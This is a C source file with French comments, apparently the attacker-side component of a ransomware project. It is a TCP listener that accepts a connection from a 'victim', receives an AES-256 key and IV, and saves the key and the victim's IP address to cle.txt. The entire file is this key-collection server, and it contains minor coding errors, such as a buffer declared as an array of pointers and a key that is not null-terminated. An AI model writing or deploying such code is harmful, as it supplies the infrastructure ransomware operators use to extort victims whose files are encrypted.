#include <stdio.h>
#include <sys/socket.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <string.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <netdb.h>
#define BUFFER_SIZE 160

void handle_error(){
    printf("Error\n");
    exit(0);
}

int main(void) {
    int sockid;
    int server_port = 8888;
    char *server_ip = "127.0.0.1";
    sockid = socket(AF_INET, SOCK_STREAM, 0);
    

    struct sockaddr_in server_addr, client_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(server_port);
    server_addr.sin_addr.s_addr = INADDR_ANY;
    //création du socket


    char *buffer[BUFFER_SIZE];
    int n, client_socket;
    int bind_result = bind(sockid, (const struct sockaddr *) &server_addr, sizeof(server_addr));

    if (bind_result < 0) {
        printf("Erreur lors du bond");
    } 
    else {
        printf("Écoute \n");
        n = listen(sockid, 1);
        if (n < 0) {
            printf("Erreur lors de l'écoute()\n");
            handle_error();
        }
        int len = sizeof(client_addr);
        client_socket = accept(sockid, (struct sockaddr *) &client_addr, &len);

        if (client_socket < 0) {
            printf("Erreur lors de la connection");
            handle_error();
        }
        printf("connection venant de %s acceptée\n",
               inet_ntoa(client_addr.sin_addr)); //affichage de l'adresse ip de la victime
        n = recv(client_socket, (char *) buffer, BUFFER_SIZE, MSG_WAITALL);
        
    }
    char *key = (char *)buffer;
    char *new_ip = inet_ntoa(client_addr.sin_addr);
    
    close(sockid);
    
    FILE *file = fopen("cle.txt", "w");
    if (file == NULL) {
        // Erreur lors de l'ouverture du fichier
        printf("Erreur lors de l'ouverture de fichier!\n");
        return 1;
    }

    // Écrit la clé AES 256 bits et l'IV 128 bits dans le fichier
    if (fputs((char*)key, file) == EOF) {
        // Erreur lors de l'écriture de la clé dans le fichier
        printf("Erreur lors de l'écriture de la clé!\n");
        return 1;
    }
    if (fputs("\n", file) == EOF) {
        // Erreur lors de l'écriture du retour à la ligne
        printf("Erreur lors de l'écriture dans le fichier!\n");
        return 1;
    }
    if (fputs((char*)new_ip, file) == EOF) {
        // Erreur lors de l'écriture de l'IV dans le fichier
        printf("Erreur lors de l'écriture de l'adresse!\n");
        return 1;
    }
    // Ferme le fichier
    fclose(file);

    return 0;
}
